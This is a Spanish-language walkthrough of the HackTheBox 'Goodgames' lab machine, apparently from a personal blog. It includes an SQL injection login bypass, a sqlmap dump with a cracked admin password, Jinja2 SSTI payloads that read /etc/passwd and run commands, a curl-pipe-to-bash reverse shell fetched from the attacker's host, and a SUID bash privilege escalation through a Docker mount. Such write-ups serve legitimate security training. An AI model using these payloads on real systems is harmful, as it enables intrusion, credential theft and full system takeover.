---
layout      : post
title       : "Goodgames - HackTheBox"
author      : elc4br4
image       : assets/images/HTB/Goodgames-HackTheBox/goodgames.webp
category    : [ htb ]
tags        : [ Linux ]
---

🎮🕹️En esta máquina Linux de nivel easy tocaremos un poco de sql, a través de sqlmap, explotaremos una vulnerabilidad ssti y escalaremos privielgios a través del binario bash jugando con los poermisos del mismo desde docker y una shell ssh🕹️🎮.

🎥Canal Writeups Youtube🎬 --> [https://www.youtube.com/channel/UCllewdxU0OQudNp9-1IVJYQ](https://www.youtube.com/channel/UCllewdxU0OQudNp9-1IVJYQ)

![](/assets/images/HTB/Goodgames-HackTheBox/goodgames2.webp)

![](/assets/images/HTB/Goodgames-HackTheBox/estadisticas.webp)

[![HTBadge](https://www.hackthebox.eu/badge/image/533771)](https://www.hackthebox.com/home/users/profile/533771)

***


**Un pequeño INDICE**

1. [Reconocimiento](#reconocimiento).
2. [Enumeración Web](#enum-web)
3. [Inyección SQL](#sql).
4. [SSTI](#ssti).
5. [Contenedor docker](#docker).
6. [Escalada de Privilegios](#privesc).


***

# Reconocimiento [#](reconocimiento) {#reconocimiento}

Como de costumbre comenzamos lanzando la utilidad whichsystem para descubrir que sistema operativo corre la máquina que vamos a atacar.

Esta heramienta creada por s4vitar se basa en el ttl (time to live) para identificar si es una máquina que corre un sistema operativo Linux o Windows.

| TTL    | Sistema Operativo | 
| :----- | :------- | 
| 64     | Linux    | 
| 128    | Windows  |

```bash
❯ whichSystem.py 10.10.11.130

	10.10.11.130 (ttl -> 63): Linux
```

Ahora ya se que me enfrento a una máquina linux, ya que su ttl es 63, aunque generalmente debería ser 64.

A continaución lanzo el <span style="color:red"> reconocimiento de puertos </span> para descubrir puertos abiertos en el sistema y poder comenzar con la explotación de la máquina.

Pero solo descubro el puerto 80 abierto.

```bash
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.51
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
|_http-title: GoodGames | Community and Store
Service Info: Host: goodgames.htb
```

> Dominio goodgames.htb 

> Servidor Apache 2.4.51

# Enumeración [#](enumeración) {#enumeración}

***

## Enumeración Web [🔢](#enum-web) {#enum-web}

Antes de acceder a ojear el servidor web desde el navegador, lanzo la herramienta whatweb para que me arroje informacióna acerca de la web que corre en el puerto 80.

```bash
❯ whatweb 10.10.11.130
http://10.10.11.130 [200 OK] Bootstrap, Country[RESERVED][ZZ], Frame, HTML5, HTTPServer[Werkzeug/2.0.2 Python/3.9.2], IP[10.10.11.130], JQuery, Meta-Author[_nK], PasswordField[password], Python[3.9.2], Script, Title[GoodGames | Community and Store], Werkzeug[2.0.2], X-UA-Compatible[IE=edge]
```

Ahora accedo desde el navegador al servidor web.

![](/assets/images/HTB/Goodgames-HackTheBox/web1.webp)

Antes de nada voy a fuzzear para descubrir rutas en el servidor.

```bash
********************************************************
💻 Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://goodgames.htb/FUZZ

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                    
=====================================================================

000000023:   200        908 L    2572 W     44206 Ch    "blog"                                                                                                                     
000000208:   200        727 L    2070 W     33387 Ch    "signup"                                                                                                                   
000001216:   302        3 L      24 W       208 Ch      "logout"                                                                                                                   
000012941:   200        729 L    2069 W     32744 Ch    "forgot-password"                                                                                                          
000044933:   200        286 L    620 W      10524 Ch    "coming-soon" 
```

Y encuentro varias rutas de interés como /signup y /forgot-password.

Accedo a la ruta /signup donde encuentro un formulario de registro y otro de login.

![](/assets/images/HTB/Goodgames-HackTheBox/login-web.webp)


# Inyección SQL [#](inyección) {#sql}

Primeramente antes de registrarme pruebo varias inyecciones sql para intentar bypassear el login.

![](/assets/images/HTB/Goodgames-HackTheBox/sqlpayloads.webp)

Pruebo con el típico `' OR 1=1-- -` (en el campo email) y cualquier contraseña.

![](/assets/images/HTB/Goodgames-HackTheBox/sql1.webp)

![](/assets/images/HTB/Goodgames-HackTheBox/sql2.webp)

Y por suerte funciona y consigo acceso a la cuenta del usuario Administrador :)

![](/assets/images/HTB/Goodgames-HackTheBox/admin-perfil.webp)

Pero dentro del panel de usuario administrador no puedo hacer nada en especial, por lo que ha de haber algo más asique lo primero que hago es lanzar un escaneo de vhost por si hubiera alguno.

A través de wfuzz ejecuto el escaneo con el comando:

```bash
# Escaneo vhost a través de wfuzz
---------------------------------
wfuzz -H "Host: FUZZ.goodgames.htb" --hl 1734 --hc 404,403 -c -z file,"/usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt" http://10.10.11.130
```
Pero no encuentro nada... por lo que sigo buscando por la web algo que me de una pista o un hilo para continuar...

Asique tras un tiempo buscando encontré lo siguiente en el código fuente:

![](/assets/images/HTB/Goodgames-HackTheBox/vhost.webp)

> VHOST --> internal-administration.goodgames.htb

Lo añado al vhost y accedo desde el navegador.

Al acceder me encuentro con un panel de inicio de sesión, pero no dispongo de credenciales por lo que primero he de buscarlas y lo único que se me ocurre es volver atrás... en el punto de la inyección sql en el campo del email del login.

Por lo que decido usar la herramienta sql y para ello sigo estos pasos:

* Capturo la petición con burpsuite y la guardo en un archivo.

![](/assets/images/HTB/Goodgames-HackTheBox/burp.webp)

```burp
POST /login HTTP/1.1
Host: goodgames.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://goodgames.htb/signup
Content-Type: application/x-www-form-urlencoded
Content-Length: 56
Origin: http://goodgames.htb
DNT: 1
Connection: close
Cookie: session=.eJw1yz0KgDAMBtC7fHMRXDN5E4kkjYX-QNNO4t3t4v7egzN29RsUObsGaOGUQWApqR7WmhgX9e0eFwKSgPaA3MxUUgWNPlearr0u9j-8Hz1GHgw.Y5Va1Q.196byvxnsltOJqreVcIHC7DrRHo
Upgrade-Insecure-Requests: 1
email=%27+union+select+1%2C2%2C3%2C4--+-&password=111111
```

* Una vez tengo la petición guarda en un archivo, ya puedo proceder, lo primero es descubrir el nombre de la base de datos.

![](/assets/images/HTB/Goodgames-HackTheBox/sqlmap1.webp)

* Ahora ya se que existen dos bases de datos, `main` e `information_schema`, por lo que el siguiente paso es descubrir las tablas existentes dentro de la BD.

```sql
Database: main
[3 tables]
+---------------+
| user          |
| blog          |
| blog_comments |
+---------------+
```

* De nuevo encuentro la tabla user, donde podría haber datos de usuario y contraseñas... asique lo siguiente es proceder a leer las columnas de la tabla user.

```sql
Database: main
Table: user
[4 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| email    | varchar(255) |
| id       | int          |
| name     | varchar(255) |
| password | varchar(255) |
+----------+--------------+
```

A través de sqlmap consigo descubrir y descifrar uno de los hashes.

```sql
Database: main                                                                                                                                                                             
Table: user
[1 entry]
+----+-------+---------------------+-------------------------------------------------------+
| id | name  | email               | password                                              |
+----+-------+---------------------+-------------------------------------------------------+
| 1  | admin | admin@goodgames.htb | 2b22337f218b2d82dfc3b6f77e7cb8ec (superadministrator) |
+----+-------+---------------------+-------------------------------------------------------+
```

Ahora que ya tengo estas credenciales, pruebo a usarlas para el login del vhost que encontré anteriormente.

![](/assets/images/HTB/Goodgames-HackTheBox/web2.webp)

Accedo al panel y lo primero que veo que me llama la atención es que usa la tecnología flask.

Pero antes de nada lanzo el comando whatweb para descubrir algo más de información sobre la web.

![](/assets/images/HTB/Goodgames-HackTheBox/whatweb2.webp)

Veo que usa la tecnología Werkzeug/2.0.2 Python/3.6.7 y usa Flask por lo que comencé a buscar información al repecto, pero no encontré nada relevante.

# SSTI [#](ssti) {#ssti}

Lo que pude ver en el panel web es que puedo actualizar el nombre del usuario administrador, por lo que probé diferentes cosas, como por ejemplo un pequeño payload SSTI.

```bash
# Payload para detectar SSTI
{{7*7}}
```

Y puedo ver la respuesta en el propio panel web.

![](/assets/images/HTB/Goodgames-HackTheBox/ssti.webp)

Estuve buscando información al respecto y encontré varios payloads que podrían servirme, asique probé uno de ellos para intentar leer el archivo passwd.

```bash
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```

A continuación probé un payload para intentar ejecutar comandos

```bash
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

![](/assets/images/HTB/Goodgames-HackTheBox/ssti2.webp)

Y funciona, puedo ejecutar comandos en el sistema, por lo que creo una reverse shell en bash y ejecuto el siguiente payload.

![](/assets/images/HTB/Goodgames-HackTheBox/shell.webp)

```bash
{{request.application.__globals__.__builtins__.__import__('os').popen('curl 10.10.14.5:8081/rev.sh | bash').read()}}
```

Y por fin consigo la shell, y parece que soy usuario root directamente... pero no puedo leer la flag del usuario root.

# Contenedor Docker [#](docker) {#docker}

Por lo que enumerando veo que estoy en un contenedor docker.

```bash
root@3a453ab39d3d:/home/augustus# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.19.0.2  netmask 255.255.0.0  broadcast 172.19.255.255
        ether 02:42:ac:13:00:02  txqueuelen 0  (Ethernet)
        RX packets 3641  bytes 581698 (568.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3010  bytes 4080586 (3.8 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Antes de nada realizo un descubrimiento de hosts en la red 172.19.0.2, a través de un script en bash.

```bash
#!/bin/bash

function ctrl_c(){
	echo -e "\n\n[!] Saliendo...\n"
	tput cnorm; exit 1
# Ctrl+C
trap ctrl_c INT
tput civis
for i in $(seq 1 254); do 
	timeout 1 bash -c "ping -c 1 172.19.0.$i" &> /dev/null && echo "[+] El host 172.19.0.$i - ACTIVO" &
done; wait
tput cnorm
```
Y al ejecutarlo me reporta lo siguiente:

```bash
root@3a453ab39d3d:/tmp# ./hostDiscovery.sh 
[+] El host 172.19.0.2 - ACTIVO
[+] El host 172.19.0.1 - ACTIVO
```

Descubro que el host 172.19.0.1 está activo, por lo que el siguiente paso es realizar un descubrimiento de puertos en el host que acabo de descubrir a través de otro script en bash.

```bash
#!/bin/bash

function ctrl_c(){
	echo -e "\n\n[!] Saliendo... \n"
	tput cnorm; exit 1
#CTrl+C
trap ctrl_c INT
tput civis
for port in $(seq 1 65535); do
	timeout 1 bash -c "echo '' > /dev/tcp/172.19.0.1/$port " 2>/dev/null && echo "[+] Puerto $port - ABIERTO" &
done;wait 
tput cnorm
```

Lo paso. lo ejecuto y me reporta los siguientes puertos abiertos.

```bash
root@3a453ab39d3d:/tmp# ./portDiscovery.sh 
[+] Puerto 80 - ABIERTO
[+] Puerto 22 - ABIERTO
```

El puerto 22 está abierto, por lo que intento loguearme con el usuario augustus y probar con la contraseña que obtuvimos para acceder al panel web del vhost.

Por suerte se reutiliza la contraseña superadministrator.

![](/assets/images/HTB/Goodgames-HackTheBox/ssh.webp)


# Escalada de Privilegios [#](privesc) {#privesc}

Antes de escalar me pude fijar que en la shell de docker existía un directorio del usuario augustus `/home/augustus`, pero si leo el archivo passwd veo que ese usuario no existe.

![](/assets/images/HTB/Goodgames-HackTheBox/passwd.webp)

Por lo que seguramente el directorio /home/augustus es probable que sea un montaje, como podemos ver:

![](/assets/images/HTB/Goodgames-HackTheBox/df.webp)

Por lo que se me ocurre probar algo, podría copiar el binario bash de la máquina ssh como usuario augustus y modificar los permisos del mismo para convertirlo en suid y posteriomente ejecutarlo desde el contenedor como root.

```bash
augustus@GoodGames:~$ cp /bin/bash .
augustus@GoodGames:~$ ls
bash  user.txt

-----------------------------------

root@3a453ab39d3d:/home/augustus chown root:root /home/augustus/bash  
root@3a453ab39d3d:/home/augustus chmod +s /home/augustus/bash

-----------------------------------

augustus@GoodGames:~$ ./bash -p
bash-5.1# id
uid=1000(augustus) gid=1000(augustus) euid=0(root) egid=0(root) groups=0(root),1000(augustus)
bash-5.1# whoami
root
```

![](/assets/images/HTB/Goodgames-HackTheBox/flags.webp)

![](/assets/images/HTB/Goodgames-HackTheBox/pwned.webp)

